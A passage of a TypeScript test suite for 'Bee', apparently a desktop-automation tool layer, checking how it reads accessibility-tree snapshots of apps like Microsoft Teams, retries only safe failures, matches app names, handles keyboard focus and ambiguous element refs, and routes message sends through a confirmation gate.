    for (const failure of [{ ok: false, code: "INTERNAL", message: "x" }, { ok: false, code: "INTERNAL", retry: "unsafe" }, { ok: false, code: "APP_NOT_FOUND", retry: "safe" }] as AgentDesktopResult[]) {
      const { run, calls } = timedRun(() => failure);
      const { call } = setup({ run, askFirst: false });
      await call("snapshot", { app: "Microsoft Teams" });
      // APP_NOT_FOUND asks list-apps for the app's real name, but never reads the same name twice.
      expect(calls.filter(({ command }) => command === "snapshot"), JSON.stringify(failure)).toHaveLength(1);
    }
    // A renderer that is still waking up reads again, whatever the code.
    const { run, calls } = timedRun(() => ({ ok: false, code: "ACTION_FAILED", retry: "safe", kind: "renderer_accessibility_activation_required" }));
    await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    expect(calls).toHaveLength(2);
  });

  it("reads a thin window again and keeps the better read; a thin read beats a failed one", async () => {
    const better = timedRun((_call, index) => ({ ok: true, data: index === 0 ? tree(2) : tree(30) }));
    const shown = await setup({ run: better.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    expect(shown).toContain('button "Item 29" @s7:e29');
    expect(shown).not.toMatch(/Few elements/);
    const failed = timedRun((_call, index) => (index === 0 ? { ok: true, data: tree(2) } : INTERNAL));
    const thin = await setup({ run: failed.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    expect(thin).toContain('button "Item 1" @s7:e1');
    // Bee already waited: the AI tries the tree another way, then stops.
    expect(thin).toMatch(/Few elements came back, though Bee gave the app time to load\. Try find by role .* or a skeleton snapshot then root\. If those show nothing usable either, stop and say Bee cannot control this app\./);
  });

  it("returns a partial tree rather than an error, and reads a partial one again only when it is small", async () => {
    expect(thinTree(tree(30, { complete: false }))).toBe(false);
    expect(thinTree(tree(12, { complete: false }))).toBe(true);
    expect(thinTree(tree(12, { complete: true }))).toBe(false);
    expect(thinTree(tree(2))).toBe(true);
    expect(thinTree({ ref_count: 40, tree: {} })).toBe(false);
    const { run, calls } = timedRun(() => ({ ok: true, data: tree(30, { complete: false }) }));
    expect(await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/partial: raise detail with root/);
    expect(calls).toHaveLength(1);
  });

  it("never reads a region or a menu twice for being small, but reads a timed-out region again with more time", async () => {
    const { run, calls } = timedRun(({ args }, index) => {
      if (args.includes("--surface=menu")) return { ok: true, data: tree(1) };
      if (args.some((arg) => arg.startsWith("--root="))) return index === 2 ? { ok: false, code: "TIMEOUT", retry: "safe" } : { ok: true, data: tree(1) };
      return { ok: true, data: tree(8) };
    });
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Microsoft Teams" });
    await call("snapshot", { app: "Microsoft Teams", surface: "menu" });
    await call("snapshot", { root: "@s7:e1" });
    expect(calls.map(({ args }) => args.slice(2).join(" "))).toEqual([
      "--app=Microsoft Teams --timeout-ms=12000",
      "--app=Microsoft Teams --surface=menu --timeout-ms=12000",
      "--root=@s7:e1 --timeout-ms=12000",
      "--root=@s7:e1 --timeout-ms=25000",
    ]);
  });

  it("gives find a budget, and reads again once when that fails where a retry is safe", async () => {
    const { run, calls } = timedRun((_call, index) => (index === 0 ? { ok: false, code: "TIMEOUT", retry: "safe" } : { ok: true, data: { matches: [{ role: "textfield", name: "Type a message", ref_id: "@s8:e1" }] } }));
    const { call } = setup({ run, askFirst: false });
    expect(await call("find", { app: "Microsoft Teams", role: "textfield" })).toBe('textfield "Type a message" @s8:e1');
    expect(calls.map(({ args, timeoutMs }) => [args.at(-1), timeoutMs])).toEqual([
      ["--timeout-ms=12000", 18_000],
      ["--timeout-ms=25000", 31_000],
    ]);
  });

  it("reads a ref once more after a safe INTERNAL, and says a slow read is slow, not that something happened", async () => {
    const { run, calls } = timedRun(({ command }) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : { ok: false, code: "TIMEOUT", retry: "safe" }));
    const { call } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("read", { ref: "@s1abc:e1" })).toMatch(/did not finish in time/);
    expect(calls.map(({ command }) => command)).toEqual(["snapshot", "get", "get"]);
  });

  it("turns a command the allowlist refuses into a clear error, never a generic failure", async () => {
    const run: ComputerRun = async () => {
      throw new Error("agent-desktop flag value not allowed: --app");
    };
    expect(await setup({ run, askFirst: false }).call("list_apps", {})).toMatch(/^Error REFUSED: Bee does not run that/);
  });

  it("logs agent-desktop's code and redacted message for every failed command", async () => {
    const events: DebugEvent[] = [];
    setDebugSink({ write: (event) => events.push(event), wants: () => true });
    try {
      const { run } = timedRun(() => INTERNAL);
      await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" });
    } finally {
      setDebugSink(null);
    }
    const failed = events.filter((event) => event.event === "exec-failed");
    expect(failed).toHaveLength(2);
    expect(failed[0]).toMatchObject({ level: "warn", category: "computer", data: { command: "snapshot", code: "INTERNAL", message: "Accessibility deadline exhausted before IPC", retry: "safe" } });
  });
});

describe("computerTools: agent-desktop 1.1 snapshots and refs", () => {
  type Timed = { command: ComputerUseCommand; args: string[]; timeoutMs?: number };
  const recorded = (reply: (call: Timed, index: number) => AgentDesktopResult) => {
    const calls: Timed[] = [];
    const run: ComputerRun = async (command, args, options) => {
      const call = { command, args, timeoutMs: options?.timeoutMs };
      calls.push(call);
      return reply(call, calls.length - 1);
    };
    return { run, calls };
  };
  const teams = (children: unknown[], extra: Record<string, unknown> = {}) => ({
    app: "Microsoft Teams",
    window: { id: "w-7", title: "Chat | Microsoft Teams" },
    snapshot_id: "s7",
    complete: true,
    ...extra,
    tree: { role: "window", children },
  });
  const buttons = (count: number) => Array.from({ length: count }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s7:e${index}` }));
  const DONE: AgentDesktopResult = { ok: true, data: { disposition: { delivery: "delivered_verified" } } };
  // A settled Chromium window at the default depth: its own buttons, then unnamed groups cut off with more inside.
  const CUT = [
    { role: "button", name: "Minimize", ref_id: "@s7:e1" },
    { role: "button", name: "Close", ref_id: "@s7:e2" },
    { role: "group", ref_id: "@s7:e3", children_count: 120 },
    { role: "group", name: "Chat", ref_id: "@s7:e4", children_count: 40 },
    { role: "group", ref_id: "@s7:e5", children_count: 8 },
  ];
  const DEEP = [...CUT.slice(0, 2), { role: "textfield", name: "Type a message", ref_id: "@s7:e9" }, { role: "button", name: "Send", ref_id: "@s7:e10" }];

  it("keeps the tool surface small: read checks states, an empty set_value clears, set_state ticks and expands, scroll without a direction brings a ref into view", async () => {
    const { call, calls, tools, steps } = setup({ askFirst: false });
    expect(Object.keys(tools).sort()).toEqual([...COMPUTER_TOOL_NAMES].sort());
    expect(COMPUTER_TOOL_NAMES).toHaveLength(18);
    await call("snapshot", { app: "Discord" });
    await call("read", { ref: "@s1abc:e1" });
    await call("read", { ref: "@s1abc:e1", property: "value" });
    await call("read", { ref: "@s1abc:e2", property: "enabled" });
    await call("set_value", { ref: "@s1abc:e1", value: "", effect: "none" });
    await call("set_state", { ref: "@s1abc:e4", state: "expanded" });
    await call("set_state", { ref: "@s1abc:e4", state: "collapsed" });
    await call("set_state", { ref: "@s1abc:e3", state: "checked" });
    await call("set_state", { ref: "@s1abc:e3", state: "unchecked" });
    await call("scroll", { ref: "@s1abc:e4", direction: "down" });
    await call("scroll", { ref: "@s1abc:e2" });
    expect(calls.slice(1).map(({ command, args }) => [command, ...args])).toEqual([
      // A text field reads its value by default: since agent-desktop 0.10 its text is what a person reads, not its content.
      ["get", "@s1abc:e1", "--property=value"],
      ["get", "@s1abc:e1", "--property=value"],
      ["is", "@s1abc:e2", "--property=enabled"],
      ["clear", "@s1abc:e1"],
      ["expand", "@s1abc:e4"],
      ["collapse", "@s1abc:e4"],
      ["check", "@s1abc:e3"],
      ["uncheck", "@s1abc:e3"],
      ["scroll", "@s1abc:e4", "--direction=down", "--amount=3"],
      ["scroll-to", "@s1abc:e2"],
    ]);
    expect(steps.slice(4, 9)).toEqual(["Clearing Message @sam…", "Expanding Channels…", "Collapsing Channels…", "Ticking Compose…", "Unticking Compose…"]);
  });

  it("offers only the surfaces this computer has: since agent-desktop 1.1 another kind is INVALID_ARGS", () => {
    type Schema = { safeParse: (value: unknown) => { success: boolean } };
    const parses = (platform: ComputerPlatform, tool: "snapshot" | "find", surface: string) => (setup({ platform }).tools[tool].inputSchema as unknown as Schema).safeParse({ app: "Microsoft Teams", surface }).success;
    for (const tool of ["snapshot", "find"] as const) {
      expect(["menu", "sheet"].map((surface) => parses("windows", tool, surface)), tool).toEqual([true, true]);
      expect(["menubar", "popover", "alert", "window"].map((surface) => parses("windows", tool, surface)), tool).toEqual([false, false, false, false]);
      expect(["menu", "menubar", "sheet", "popover", "alert"].every((surface) => parses("mac", tool, surface)), tool).toBe(true);
    }
  });

  it("reads a Windows window again with more time when it could not prove its refs, and keeps the proven read", async () => {
    const { run, calls } = recorded(({ command }, index) => (command === "snapshot" ? { ok: true, data: teams(buttons(index === 0 ? 30 : 12), index === 0 ? { identity_unproven: true } : {}) } : DONE));
    const { call, steps } = setup({ run, askFirst: false, platform: "windows" });
    const shown = await call("snapshot", { app: "Microsoft Teams" });
    expect(calls.map(({ args, timeoutMs }) => [args.slice(2).join(" "), timeoutMs])).toEqual([
      ["--app=Microsoft Teams --timeout-ms=12000", 18_000],
      ["--app=Microsoft Teams --max-depth=25 --timeout-ms=25000", 31_000],
    ]);
    // Fewer refs, but each one acts.
    expect(shown).toContain('button "Item 11" @s7:e11');
    expect(shown).not.toContain("@s7:e29");
    expect(shown).not.toMatch(/refs may be refused/);
    expect(steps).toEqual(["Looking at Microsoft Teams…", "Waiting for the app…"]);
  });

  it("says so when a Windows window still cannot prove its refs, and never reads again for that on a Mac", async () => {
    const still = recorded(() => ({ ok: true, data: teams(buttons(30), { identity_unproven: true }) }));
    expect(await setup({ run: still.run, askFirst: false, platform: "windows" }).call("snapshot", { app: "Microsoft Teams" })).toMatch(
      /could not read the whole window in time, so some refs may be refused \(AMBIGUOUS_TARGET\)/,
    );
    expect(still.calls).toHaveLength(2);
    // A Mac ref carries its element's own address, so it acts without that proof.
    const mac = recorded(() => ({ ok: true, data: teams(buttons(30), { identity_unproven: true }) }));
    expect(await setup({ run: mac.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).not.toMatch(/refused/);
    expect(mac.calls).toHaveLength(1);
  });

  it("reads a window cut off by depth again, deeper, and keeps the read with controls; never a skeleton, which is shallow by design", async () => {
    expect(shallowTree(teams(CUT))).toBe(true);
    expect(shallowTree(teams(DEEP))).toBe(false);
    expect(shallowTree(SNAPSHOT)).toBe(false);
    const { run, calls } = recorded(({ args }) => ({ ok: true, data: teams(args.some((arg) => arg.startsWith("--max-depth=")) ? DEEP : CUT) }));
    const shown = await setup({ run, askFirst: false, platform: "windows" }).call("snapshot", { app: "Microsoft Teams" });
    expect(calls.map(({ args }) => args.slice(2).join(" "))).toEqual(["--app=Microsoft Teams --timeout-ms=12000", "--app=Microsoft Teams --max-depth=25 --timeout-ms=25000"]);
    // Fewer refs than the cut read, but these are the controls.
    expect(shown).toContain('textfield "Type a message" @s7:e9');
    expect(shown).not.toMatch(/sit deeper/);
    const skeleton = recorded(() => ({ ok: true, data: teams(CUT) }));
    expect(await setup({ run: skeleton.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams", skeleton: true })).not.toMatch(/sit deeper/);
    expect(skeleton.calls).toHaveLength(1);
    // Still cut off after the deeper read: the AI drills one region, and stops if that shows nothing either.
    const stuck = recorded(() => ({ ok: true, data: teams(CUT) }));
    expect(await setup({ run: stuck.run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/The controls sit deeper than this read: snapshot one region marked inside with root/);
    expect(stuck.calls).toHaveLength(2);
  });

  it("never reads again when agent-desktop says waiting cannot help", async () => {
    const { run, calls } = recorded(() => ({ ok: false, code: "INTERNAL", retry: "safe", retryable: false }));
    expect(await setup({ run, askFirst: false }).call("snapshot", { app: "Microsoft Teams" })).toMatch(/Waiting will not help: try another way\.$/);
    expect(calls).toHaveLength(1);
  });

  it("tells the AI what agent-desktop 1.1's identity and delivery kinds mean", () => {
    expect(errorLine({ ok: false, code: "AMBIGUOUS_TARGET", kind: "identity_not_unique", retry: "safe" })).toMatch(/identical twin in the window.*unique in the window.*If there is none, stop and say Bee cannot tell which one to use\./);
    expect(errorLine({ ok: false, code: "AMBIGUOUS_TARGET", kind: "saved_ref_ambiguous", retry: "safe" })).toMatch(/identical element appeared since the snapshot\. Take a new snapshot/);
    expect(errorLine({ ok: false, code: "AMBIGUOUS_TARGET" })).toMatch(/several windows or elements match/);
    expect(errorLine({ ok: false, code: "TIMEOUT", kind: "resolution_identity_unknown", retry: "safe" })).toMatch(/so nothing was done/);
    // Delivered, but it reads back otherwise: no second "may still have happened" on top.
    const reshaped = errorLine({ ok: false, code: "ACTION_FAILED", kind: "post_action_verification", retry: "unsafe" });
    expect(reshaped).toMatch(/^Error ACTION_FAILED: it happened, but the element now reads differently/);
    expect(reshaped).not.toMatch(/may still have happened/);
    // Not delivered: nothing happened, so there is no double send to look for. Anything else may have landed.
    expect(errorLine({ ok: false, code: "ACTION_FAILED", retry: "safe" })).toMatch(/^Error ACTION_FAILED: nothing was done \(agent-desktop says it was not delivered\)/);
    expect(errorLine({ ok: false, code: "ACTION_FAILED", retry: "unsafe" })).toMatch(/may still have happened/);
    expect(errorLine({ ok: false, code: "TIMEOUT" })).toMatch(/may still have happened/);
    expect(errorLine({ ok: false, code: "INVALID_ARGS", retry: "safe" }, true)).toMatch(/a surface must be one this computer has/);
    expect(errorLine({ ok: false, code: "ACTION_FAILED", kind: "live_read_incomplete", retry: "safe", retryable: false })).toMatch(/new snapshot.*Waiting will not help: try another way\.$/);
  });

  it("acts once more by itself only when agent-desktop could not check the element in time and sent nothing", async () => {
    const unknown: AgentDesktopResult = { ok: false, code: "TIMEOUT", kind: "resolution_identity_unknown", retry: "safe" };
    const { run, calls } = recorded(({ command }, index) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : index === 1 ? unknown : DONE));
    const { call, control } = setup({ run, askFirst: false });
    await call("snapshot", { app: "Discord" });
    expect(await call("click", { ref: "@s1abc:e3", effect: "none" })).toBe("Done (delivered_verified).");
    expect(calls.map(({ command }) => command)).toEqual(["snapshot", "click", "click"]);
    // Still one step.
    expect(control.steps()).toBe(2);
    // Anything that may have landed, or that agent-desktop does not call safe, is never repeated.
    for (const failure of [{ ...unknown, retry: "unsafe" }, { ok: false, code: "TIMEOUT", retry: "safe", kind: "actionability_timeout" }, { ok: false, code: "ACTION_FAILED", retry: "unsafe" }] as AgentDesktopResult[]) {
      const once = recorded(({ command }) => (command === "snapshot" ? { ok: true, data: SNAPSHOT } : failure));
      const tools = setup({ run: once.run, askFirst: false });
      await tools.call("snapshot", { app: "Discord" });
      await tools.call("click", { ref: "@s1abc:e3", effect: "none" });
      expect(once.calls.filter(({ command }) => command === "click"), JSON.stringify(failure)).toHaveLength(1);
    }
  });

  it("says what an action left, from agent-desktop's read-back, so the AI need not look again", () => {
    expect(formatDone({ disposition: { delivery: "delivered_verified" }, post_state: { value: "Running late", states: ["focused"] } })).toBe('Done (delivered_verified). Now: value="Running late" [focused].');
    expect(formatDone({ disposition: { delivery: "delivered_verified" }, post_state: { checked: true, expanded: false } })).toBe("Done (delivered_verified). Now: [checked, not expanded].");
    expect(formatDone({ disposition: { delivery: "delivered_unverified" }, surfaces: [{ kind: "sheet" }] })).toBe("Done (delivered_unverified). Open now: sheet. Act on it next: snapshot with that surface.");
    for (const odd of [{ post_state: "odd" }, { post_state: { states: ["Not A Token", 3] } }, { post_state: null }]) expect(formatDone(odd)).toBe("Done.");
  });
});

describe("computerTools: the tree is the only way in", () => {
  const TEAMS = "Microsoft Teams";
  const PICTURE = /screenshot|click_at|click at a point|picture|image/i;
  type Timed = { command: ComputerUseCommand; args: string[] };
  const recorded = (reply: (call: Timed) => AgentDesktopResult) => {
    const calls: Timed[] = [];
    const run: ComputerRun = async (command, args) => {
      const call = { command, args };
      calls.push(call);
      return reply(call);
    };
    return { run, calls };
  };
  const teams = (children: unknown[], extra: Record<string, unknown> = {}) => ({
    app: TEAMS,
    window: { id: "w-7", title: "Chat | Microsoft Teams" },
    snapshot_id: "s7",
    complete: true,
    ...extra,
    tree: { role: "window", name: TEAMS, children },
  });

  it("has no screenshot or click at a point, sends the AI text only, and types only into a ref", () => {
    const { tools } = setup();
    for (const name of ["screenshot", "click_at"]) {
      expect(Object.keys(tools), name).not.toContain(name);
      expect(COMPUTER_TOOL_NAMES as readonly string[], name).not.toContain(name);
    }
    // No tool turns its result into a file or image part.
    for (const [name, item] of Object.entries(tools)) expect((item as { toModelOutput?: unknown }).toModelOutput, name).toBeUndefined();
    type Schema = { safeParse: (value: unknown) => { success: boolean } };
    const typeText = tools.type_text.inputSchema as unknown as Schema;
    expect(typeText.safeParse({ text: "Running late", effect: "none" }).success).toBe(false);
    expect(typeText.safeParse({ ref: "@s1abc:e1", text: "Running late", effect: "none" }).success).toBe(true);
  });

  it("says plainly that Bee cannot control an app whose tree stays empty once Bee has waited, and never offers a picture", async () => {
    const { run, calls } = recorded(({ command }) => (command === "snapshot" ? { ok: true, data: teams([]) } : { ok: true, data: { matches: [] } }));
    const { call } = setup({ run, askFirst: false });
    for (const input of [{ app: TEAMS }, { app: TEAMS, skeleton: true }]) {
      const shown = await call("snapshot", input);
      expect(shown, JSON.stringify(input)).toContain(`If those show nothing usable either, ${CANNOT_CONTROL}.`);
      expect(shown, JSON.stringify(input)).not.toMatch(PICTURE);
    }
    expect(await call("find", { app: TEAMS, role: "textfield" })).toBe("No matches.");
    // Each whole-window read ran twice (Bee waited for the app); nothing but the tree was ever asked for.
    expect(calls.map(({ command }) => command)).toEqual(["snapshot", "snapshot", "snapshot", "snapshot", "find"]);
  });

  it("says the same when a window stays cut off by depth, or its refs stay unproven on Windows", async () => {
    // Refs enough not to read as thin, but only the window's own buttons above groups cut off with more inside.
    const cut = [
      { role: "button", name: "Minimize", ref_id: "@s7:e1" },
      { role: "button", name: "Close", ref_id: "@s7:e2" },
      { role: "group", ref_id: "@s7:e3", children_count: 120 },
      { role: "group", ref_id: "@s7:e4", children_count: 40 },
      { role: "group", ref_id: "@s7:e5", children_count: 8 },
    ];
    const shallow = recorded(() => ({ ok: true, data: teams(cut) }));
    const deep = await setup({ run: shallow.run, askFirst: false }).call("snapshot", { app: TEAMS });
    expect(deep).toContain(`If those show no usable controls, ${CANNOT_CONTROL}.`);
    expect(deep).not.toMatch(PICTURE);
    const buttons = Array.from({ length: 30 }, (_, index) => ({ role: "button", name: `Item ${index}`, ref_id: `@s7:e${index}` }));
    const unproven = recorded(() => ({ ok: true, data: teams(buttons, { identity_unproven: true }) }));
    const refused = await setup({ run: unproven.run, askFirst: false, platform: "windows" }).call("snapshot", { app: TEAMS });
    expect(refused).toContain(`If they keep being refused, ${CANNOT_CONTROL}.`);
    expect(refused).not.toMatch(PICTURE);
  });

  it("never tells the AI to take a picture or click a point, whatever agent-desktop says", () => {
    const codes = [
      "STALE_REF", "SNAPSHOT_NOT_FOUND", "ELEMENT_NOT_FOUND", "AMBIGUOUS_TARGET", "APP_NOT_FOUND", "WINDOW_NOT_FOUND", "ACTION_NOT_SUPPORTED", "POLICY_DENIED",
      "ACTION_FAILED", "APP_UNRESPONSIVE", "TIMEOUT", "TIMEOUT_LOCAL", "INVALID_ARGS", "PLATFORM_NOT_SUPPORTED", "PERM_DENIED", "ABORTED", "INTERNAL", "BAD_OUTPUT",
      "SPAWN_FAILED", "REFUSED", "SOMETHING_NEW",
    ];
    const kinds = [
      undefined, "identity_not_unique", "saved_ref_ambiguous", "resolution_identity_unknown", "post_action_verification", "actionability_timeout",
      "scroll_into_view_unsupported", "live_read_incomplete",
    ];
    for (const code of codes) {
      for (const kind of kinds) {
        for (const look of [true, false]) {
          const line = errorLine({ ok: false, code, retry: "safe", ...(kind ? { kind } : {}) }, look);
          expect(line, `${code} ${kind} ${look}`).not.toMatch(PICTURE);
        }
      }
    }
    // A tree that keeps failing ends in a plain stop.
    for (const code of ["INTERNAL", "BAD_OUTPUT", "TIMEOUT", "TIMEOUT_LOCAL", "APP_UNRESPONSIVE"]) {
      expect(errorLine({ ok: false, code, retry: "safe" }, true), code).toContain(`If it keeps failing, ${CANNOT_CONTROL}.`);
    }
  });
});

describe("computerTools: Teams on Windows (app names, focus for keys, ambiguous refs, find roles)", () => {
  type Seen = { command: ComputerUseCommand; args: string[] };
  const recorded = (reply: (call: Seen) => AgentDesktopResult) => {
    const calls: Seen[] = [];
    const run: ComputerRun = async (command, args) => {
      const call = { command, args };
      calls.push(call);
      return reply(call);
    };
    return { run, calls };
  };
  const DONE: AgentDesktopResult = { ok: true, data: { disposition: { delivery: "delivered_verified" } } };
  const APPS: AgentDesktopResult = { ok: true, data: { apps: [{ name: "Bee.exe" }, { name: "chrome.exe" }, { name: "ms-teams.exe" }] } };
  const window = (id: string, children: unknown[]) => ({
    app: "ms-teams.exe",
    window: { id: "w-7", title: "Chat | Microsoft Teams" },
    snapshot_id: id,
    complete: true,
    tree: { role: "window", children },
  });
  const controls = (id: string, extra: unknown[] = []) => [
    { role: "combobox", name: "Search (Ctrl+E)", ref_id: `@${id}:e1` },
    { role: "button", name: "Item 2", ref_id: `@${id}:e2` },
    { role: "button", name: "Send", ref_id: `@${id}:e3` },
    { role: "button", name: "New chat", ref_id: `@${id}:e4` },
    { role: "treeitem", name: "Zuzanna", ref_id: `@${id}:e5` },
    { role: "group", name: "Chat list", ref_id: `@${id}:e33`, children_count: 12 },
    ...extra,
  ];
  const lines = (calls: Seen[]) => calls.map(({ command, args }) => [command, ...args.filter((arg) => !arg.startsWith("--timeout") && !["--interactive-only", "--compact"].includes(arg))].join(" "));

  it("matches the name the AI gave to a running app's real name", () => {
    const windows = ["Bee.exe", "chrome.exe", "ms-teams.exe", "ms-teams.exe"];
    expect(matchApp("ms-teams.exe", windows)).toBe("ms-teams.exe");
    expect(matchApp("MS-Teams.exe", windows)).toBe("ms-teams.exe");
    expect(matchApp("Teams", windows)).toBe("ms-teams.exe");
    expect(matchApp("Microsoft Teams", windows)).toBe("ms-teams.exe");
    expect(matchApp("Chrome", windows)).toBe("chrome.exe");
    expect(matchApp("Google Chrome", windows)).toBe("chrome.exe");
    expect(matchApp("ms-teams.exe", ["Microsoft Teams", "Google Chrome"])).toBe("Microsoft Teams");
    expect(matchApp("chrome", ["Microsoft Teams", "Google Chrome"])).toBe("Google Chrome");
    // Several, or none: the name goes through as given.
    expect(matchApp("Teams", ["ms-teams.exe", "teams-helper.exe"])).toBeNull();
    expect(matchApp("Slack", windows)).toBeNull();
    expect(matchApp("ms", windows)).toBeNull();
  });

  it("asks list-apps once when an app is not found by the name given, uses the real name, says so, and keeps it for the run", async () => {
    const { run, calls } = recorded(({ command, args }) => {
      if (command === "list-apps") return APPS;
      if (args.includes("--app=ms-teams.exe")) return command === "snapshot" ? { ok: true, data: window("s7", controls("s7")) } : { ok: true, data: { matches: [] } };
      return { ok: false, code: "APP_NOT_FOUND", message: "Application '…' was not found with exact process identity", retry: "safe" };
    });
    const { call } = setup({ run, askFirst: false, platform: "windows" });
    const shown = String(await call("snapshot", { app: "Teams", skeleton: true }));
    expect(shown).toMatch(/^Using ms-teams\.exe for Teams\.\s/);
    expect(shown).toContain('combobox "Search (Ctrl+E)" @s7:e1');
    expect(String(await call("find", { app: "Teams", name: "Zuzanna" }))).toMatch(/^Using ms-teams\.exe for Teams\. No matches/);
    expect(await call("press_key", { keys: "escape", app: "Teams", effect: "none" })).toMatch(/^Using ms-teams\.exe for Teams\. Done/);
    expect(lines(calls)).toEqual([
      "snapshot --app=Teams --skeleton",
      "list-apps",
      "snapshot --app=ms-teams.exe --skeleton",
      "find --app=ms-teams.exe --name=Zuzanna --limit=15",
      "press escape --app=ms-teams.exe",
    ]);
    // The real name always: never a placeholder or a clipped one.
    for (const { args } of calls) expect(args.join(" ")).not.toContain("…");
    // An app list_apps showed is matched before anything runs.
    const listed = recorded(({ command }) => (command === "list-apps" ? APPS : DONE));
    const tools = setup({ run: listed.run, askFirst: false, platform: "windows" });
    await tools.call("list_apps", {});
    expect(await tools.call("list_windows", { app: "Chrome" })).toMatch(/^Using chrome\.exe for Chrome\. No windows\./);
    expect(lines(listed.calls)).toEqual(["list-apps", "list-windows --app=chrome.exe"]);
  });

  it("focuses the field set_value wrote and presses once more when the app has no proven keyboard focus; or presses in a given ref", async () => {
    const noFocus: AgentDesktopResult = { ok: false, code: "ACTION_FAILED", message: "Application has no verified keyboard focus for key delivery", retry: "safe" };
    let presses = 0;
    const { run, calls } = recorded(({ command }) => {
      if (command === "snapshot") return { ok: true, data: window("s7", controls("s7")) };
      if (command === "press") return (presses += 1) === 1 ? noFocus : DONE;
      return DONE;
    });
    const { call } = setup({ run, askFirst: false, platform: "windows" });
    await call("snapshot", { app: "ms-teams.exe" });
    await call("set_value", { ref: "@s7:e1", value: "Zuzanna", effect: "none" });
    expect(await call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" })).toMatch(/^Done/);
    expect(lines(calls).slice(1)).toEqual(["set-value @s7:e1 --stdin", "press return --app=ms-teams.exe", "focus @s7:e1", "press return --app=ms-teams.exe"]);
    // ref: focus it first, then press.
    expect(await call("press_key", { keys: "return", app: "ms-teams.exe", ref: "@s7:e1", effect: "none", physical: true })).toMatch(/^Done/);
    expect(lines(calls).slice(5)).toEqual([`focus @s7:e1 ${HEADED_FLAG}`, `press return --app=ms-teams.exe ${HEADED_FLAG}`]);
    for (const { command, args } of calls) expect(() => assertComputerUse(command, args)).not.toThrow();
    // A focus Windows refuses headless is said, and nothing is pressed again.
    const refused = recorded(({ command }) =>
      command === "snapshot" ? { ok: true, data: window("s7", controls("s7")) } : command === "press" ? noFocus : command === "focus" ? { ok: false, code: "POLICY_DENIED", retry: "safe" } : DONE,
    );
    const tools = setup({ run: refused.run, askFirst: false, platform: "windows" });
    await tools.call("snapshot", { app: "ms-teams.exe" });
    await tools.call("set_value", { ref: "@s7:e1", value: "Zuzanna", effect: "none" });
    expect(await tools.call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" })).toMatch(/^Bee tried to focus the field first: Error POLICY_DENIED.*Error ACTION_FAILED/);
    expect(refused.calls.filter(({ command }) => command === "press")).toHaveLength(1);
    // No field written this run: nothing to focus.
    const none = recorded(({ command }) => (command === "press" ? noFocus : DONE));
    await setup({ run: none.run, askFirst: false, platform: "windows" }).call("press_key", { keys: "return", app: "ms-teams.exe", effect: "none" });
    expect(lines(none.calls)).toEqual(["press return --app=ms-teams.exe"]);
  });

  it("reads the window again when a saved ref is refused as ambiguous, and uses the same element there only when it is the only one", async () => {
    const ambiguous: AgentDesktopResult = { ok: false, code: "AMBIGUOUS_TARGET", kind: "identity_not_unique", message: "Saved ref was not proven unique when it was captured", retry: "safe" };
    let reads = 0;
    const region = { app: "ms-teams.exe", snapshot_id: "s9", tree: { role: "group", name: "Chat list", ref_id: "@s9:e1", children: [{ role: "treeitem", name: "Zuzanna", ref_id: "@s9:e2" }] } };
    const { run, calls } = recorded(({ command, args }) => {
      if (command === "snapshot" && args.some((arg) => arg.startsWith("--root=@s7"))) return ambiguous;
      if (command === "snapshot" && args.includes("--root=@s8:e33")) return { ok: true, data: region };
      if (command === "snapshot") return { ok: true, data: (reads += 1) === 1 ? window("s7", controls("s7")) : window("s8", controls("s8")) };
      if (["click", "set-value"].includes(command) && args[0]?.startsWith("@s7")) return ambiguous;
      return DONE;
    });
    const { call, asked } = setup({ run, platform: "windows" });
    await call("snapshot", { app: "ms-teams.exe" });
    const shown = String(await call("snapshot", { app: "ms-teams.exe", root: "@s7:e33" }));
    expect(shown).toMatch(/^Bee read the window again; that region is now @s8:e33\./);
    expect(shown).toContain('treeitem "Zuzanna" @s9:e2');
    expect(lines(calls).slice(1)).toEqual(["snapshot --root=@s7:e33", "snapshot --app=ms-teams.exe --window-id=w-7", "snapshot --root=@s8:e33"]);
    // An action that commits nothing runs once more on the same element from a new read.
    calls.length = 0;
    expect(await call("set_value", { ref: "@s7:e1", value: "Zuzanna", effect: "none" })).toBe("Done (delivered_verified). (Bee read the window again and used @s8:e1.)");
    expect(lines(calls)).toEqual(["set-value @s7:e1 --stdin", "snapshot --app=ms-teams.exe --window-id=w-7", "set-value @s8:e1 --stdin"]);
    // A send never runs again by itself: the AI acts on the new ref, through the gate.
    const send = String(await call("click", { ref: "@s7:e3", effect: "send" }));
    expect(send).toMatch(/^Error AMBIGUOUS_TARGET.*that element is now @s8:e3\. Use that ref\.$/);
    expect(asked.map(({ detail }) => detail)).toEqual(["Click “Send” in ms-teams.exe"]);
    expect(calls.filter(({ command }) => command === "click").map(({ args }) => args[0])).toEqual(["@s7:e3"]);
  });

  it("shows the new read of the window when the refused region has a twin", async () => {
    const ambiguous: AgentDesktopResult = { ok: false, code: "AMBIGUOUS_TARGET", kind: "identity_not_unique", retry: "safe" };
    let reads = 0;
    const twins = [{ role: "group", name: "Chat list", ref_id: "@s8:e34", children_count: 3 }];
    const { run, calls } = recorded(({ command, args }) => {
      if (command === "snapshot" && args.some((arg) => arg.startsWith("--root="))) return ambiguous;
      return { ok: true, data: (reads += 1) === 1 ? window("s7", controls("s7")) : window("s8", controls("s8", twins)) };
    });
    const { call } = setup({ run, askFirst: false, platform: "windows" });
    await call("snapshot", { app: "ms-teams.exe" });
    const shown = String(await call("snapshot", { root: "@s7:e33" }));
    expect(shown).toMatch(/^@s7:e33 could not be told apart from another element, so Bee read the whole window again\. Use its refs\.\n/);
    expect(shown).toContain('group "Chat list" @s8:e34');
    expect(calls.filter(({ args }) => args.some((arg) => arg.startsWith("--root=")))).toHaveLength(1);
  });

